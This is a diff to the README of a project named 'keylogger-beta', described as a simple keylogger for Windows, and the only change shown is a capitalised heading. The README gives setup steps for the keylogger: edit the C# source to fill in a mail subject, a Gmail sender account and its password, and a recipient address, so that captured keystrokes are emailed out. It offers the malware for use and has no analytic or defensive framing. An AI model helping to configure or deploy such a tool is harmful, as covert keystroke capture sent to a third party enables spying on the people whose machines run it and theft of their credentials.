@@ -1,7 +1,7 @@
 # keylogger-beta
 A simple keylogger for Windows-based systems.
 
-# Instructions:
+# instructions:
 For first you need to open the .cs filw with any text editor and go to line 67. Here you need to change "MAIL_SUBJECT" in a valid subject for the mail. In line 83 you need to change "SENDER_MAIL" in a valid gmail account for use as client for the e-mail from the keylogger (you need also to re-enter it on line 88 also with the password of the account). For last you need to put the recipient mail overwriting "RECIPIENT_MAIL" in line 84.
 
 # notes
